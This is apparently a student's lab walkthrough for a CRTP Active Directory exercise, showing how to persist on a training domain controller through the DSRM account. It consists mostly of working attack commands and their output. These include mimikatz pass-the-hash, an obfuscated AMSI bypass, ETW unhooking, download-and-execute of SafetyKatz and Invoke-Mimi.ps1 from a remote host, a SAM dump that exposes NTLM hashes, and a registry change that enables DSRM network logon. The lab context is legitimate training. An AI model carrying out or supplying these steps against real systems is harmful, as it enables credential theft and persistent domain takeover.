# CRTP: Hands-On 11

```
  • Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.
```

## Obtaining DSRM credentials for persistence

Create new session with privileges for access to the domian controller:

```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b /run:cmd" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b /run:cmd
user    : Administrator
domain  : dollarcorp.moneycorp.local
program : cmd
impers. : no
AES256  : 87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
  |  PID  2528
  |  TID  4228
  |  LSA Process is now R/W
  |  LUID 0 ; 128640733 (00000000:07aae6dd)
  \_ msv1_0   - data copy @ 000001D2EF8FB6A0 : OK !
  \_ kerberos - data copy @ 000001D2F05146C8
   \_ aes256_hmac       OK
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       -> null
   \_ rc4_hmac_old      -> null
   \_ rc4_md4           -> null
   \_ rc4_hmac_nt_exp   -> null
   \_ rc4_hmac_old_exp  -> null
   \_ *Password replace @ 000001D2EFD90AE8 (32) -> null

mimikatz(commandline) # exit
Bye!


```

Access to the domain controller and launch SafetyKatz.exe from student machine fileless:

```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>winrs -r:dcorp-dc cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin>dir C:\Users\Public
dir C:\Users\Public
 Volume in drive C has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of C:\Users\Public

05/01/2023  12:09 AM    <DIR>          .
05/01/2023  12:03 AM    <DIR>          ..
11/10/2022  10:51 PM    <DIR>          Documents
05/08/2021  01:20 AM    <DIR>          Downloads
11/16/2022  05:28 AM            64,512 Loader.exe
05/08/2021  01:20 AM    <DIR>          Music
05/08/2021  01:20 AM    <DIR>          Pictures
05/08/2021  01:20 AM    <DIR>          Videos
               1 File(s)         64,512 bytes
               7 Dir(s)  11,664,355,328 bytes free

C:\Users\Administrator>C:\Users\Public\Loader.exe -path http://172.16.100.162/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://172.16.100.162/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://172.16.100.162/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://172.16.100.162/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://172.16.100.162/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

620     {0;000003e7} 1 D 18375          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;013a0966} 0 D 20755593    dcorp\Administrator     S-1-5-21-719815819-3726368948-3917688648-500
        (13g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 20808239    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : DCORP-DC
SysKey : bab78acd91795c983aef0534e0db38c7
Local SID : S-1-5-21-627273635-3076012327-2140009870

SAMKey : f3a9473cb084668dcf1d7e5f47562659

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
```
with Mimikatz using powershell:

```
PS C:\Users\Administrator> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
PS C:\Users\Administrator> IEX (New-Object Net.webclient).DownloadString("http://172.16.100.162/Invoke-Mimi.ps1")
IEX (New-Object Net.webclient).DownloadString("http://172.16.100.162/Invoke-Mimi.ps1")
PS C:\Users\Administrator> Invoke-Mimi -Command '"toke::elevate" "lsadump::sam"'
Invoke-Mimi -Command '"toke::elevate" "lsadump::sam"'
PS C:\Users\Administrator> Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

620     {0;000003e7} 1 D 18375          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;013a0966} 0 D 20618830    dcorp\Administrator     S-1-5-21-719815819-3726368948-3917688648-500
        (13g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 20733939    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(powershell) # lsadump::sam
Domain : DCORP-DC
SysKey : bab78acd91795c983aef0534e0db38c7
Local SID : S-1-5-21-627273635-3076012327-2140009870

SAMKey : f3a9473cb084668dcf1d7e5f47562659

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

```

Modify register for System user network authentication:

```
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD


DsrmAdminLogonBehavior : 2
PSPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
PSParentPath           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control
PSChildName            : Lsa
PSDrive                : HKLM
PSProvider             : Microsoft.PowerShell.Core\Registry


```

Impersonate from local machine with DSRM administrator credentials using PTH:

```
C:\AD\Tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:dcorp-dc /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:Administrator /domain:dcorp-dc /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd
user    : Administrator
domain  : dcorp-dc
program : cmd
impers. : no
NTLM    : a102ad5753f4c441e3af31c97fad86fd
  |  PID  2944
  |  TID  6088
  |  LSA Process is now R/W
  |  LUID 0 ; 128762064 (00000000:07acc0d0)
  \_ msv1_0   - data copy @ 000001D2EFD50BC0 : OK !
  \_ kerberos - data copy @ 000001D2F0514288
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001D2EFD90E28 (32) -> null

mimikatz(commandline) # exit
Bye!

```
Finally validate access:

```
C:\Windows\system32>dir \\dcorp-dc\c$
 Volume in drive \\dcorp-dc\c$ has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\dcorp-dc\c$

05/08/2021  01:20 AM    <DIR>          PerfLogs
11/14/2022  11:12 PM    <DIR>          Program Files
05/08/2021  02:40 AM    <DIR>          Program Files (x86)
05/01/2023  12:03 AM    <DIR>          Users
11/11/2022  10:58 PM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  11,661,778,944 bytes free
```
